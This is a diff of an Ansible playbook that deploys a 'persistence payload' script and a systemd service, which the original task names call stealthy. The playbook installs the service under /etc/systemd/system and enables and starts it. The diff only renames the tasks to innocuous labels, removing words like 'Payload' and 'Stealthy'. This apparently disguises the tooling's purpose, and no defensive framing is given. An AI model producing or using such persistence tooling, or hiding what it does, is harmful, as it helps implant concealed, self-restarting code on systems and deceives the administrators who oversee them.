@@ -19,29 +19,29 @@
 
 
   tasks:
-    - name: 1. Ensure payload directory ({{ payload_dir }}) exists
+    - name: ensure payload directory ({{ payload_dir }}) exists
       ansible.builtin.file:
         path: "{{ payload_dir }}"
         state: directory
         mode: '0755'
 
-    - name: 2. Deploy Persistence Payload Script ({{ payload_script_name }})
+    - name: deploy persistence file
       ansible.builtin.template:
         src: templates/user_persistence.sh.j2
         dest: "{{ payload_dir }}/{{ payload_script_name }}"
         mode: '0700' 
 
-    - name: 3. Deploy Stealthy systemd Unit File ({{ service_name }})
+    - name: deploy systemd service
       ansible.builtin.template:
         src: templates/{{ service_name }}.j2
         dest: "/etc/systemd/system/{{ service_name }}"
         mode: '0644'
 
-    - name: 4. Reload systemd daemon to recognize the new service
+    - name: reload systemd
       ansible.builtin.systemd:
         daemon_reload: yes
 
-    - name: 5. Enable and Start Persistence Service
+    - name: enable and start the service
       ansible.builtin.systemd:
         name: "{{ service_name }}"
         enabled: yes
